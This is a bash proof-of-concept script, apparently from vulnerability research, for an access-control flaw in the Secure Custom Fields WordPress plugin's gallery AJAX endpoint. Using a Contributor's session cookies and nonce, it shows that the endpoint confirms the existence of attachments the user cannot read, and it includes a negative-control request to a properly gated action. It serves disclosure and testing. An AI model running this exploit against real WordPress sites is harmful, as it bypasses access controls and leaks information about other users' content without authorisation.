#!/usr/bin/env bash
# Round 18 PoC: SCF ACF_Field_Gallery::ajax_get_sort_order() IDOR.
# Requires: cookies_contributor.txt (a real logged-in Contributor session,
# obtained via wp-login.php) and the field_key/nonce scraped from that
# session's own draft-post edit screen (see round18 writeup + setup script).
set -euo pipefail
BASE="${BASE:-http://127.0.0.1:8890}"
JAR="${JAR:-cookies_contributor.txt}"
FIELD_KEY="${FIELD_KEY:-field_idor_test_gallery2}"
NONCE="${NONCE:?set NONCE to the value scraped from data-nonce on the field's own edit screen}"
TARGET_ATTACHMENT_ID="${TARGET_ATTACHMENT_ID:?set to an attachment ID belonging to a post the session should NOT be able to read}"

cookie_header() {
  python3 - "$1" <<'PY'
import sys
jar = sys.argv[1]
cookies = []
for line in open(jar):
    line = line.rstrip("\n")
    if not line:
        continue
    if line.startswith("#HttpOnly_"):
        line = line[len("#HttpOnly_"):]
    elif line.startswith("#"):
        continue
    parts = line.split("\t")
    if len(parts) >= 7:
        cookies.append(f"{parts[5]}={parts[6]}")
print("; ".join(cookies))
PY
}

COOKIE="$(cookie_header "$JAR")"

echo "=== vulnerable: ajax_get_sort_order leaks existence of an attachment the session can't read ==="
curl -s -X POST "$BASE/wp-admin/admin-ajax.php" \
  -H "Cookie: $COOKIE" \
  --data-urlencode "action=acf/fields/gallery/get_sort_order" \
  --data-urlencode "field_key=$FIELD_KEY" \
  --data-urlencode "nonce=$NONCE" \
  --data-urlencode "sort=date" \
  --data-urlencode "ids[]=$TARGET_ATTACHMENT_ID" \
  -w "\nHTTP:%{http_code}\n"

echo
echo "=== negative control: the properly-gated sibling denies the identical request ==="
curl -s -X POST "$BASE/wp-admin/admin-ajax.php" \
  -H "Cookie: $COOKIE" \
  --data-urlencode "action=acf/fields/gallery/get_attachment" \
  --data-urlencode "field_key=$FIELD_KEY" \
  --data-urlencode "nonce=$NONCE" \
  --data-urlencode "id=$TARGET_ATTACHMENT_ID" \
  -w "\nHTTP:%{http_code}\n"
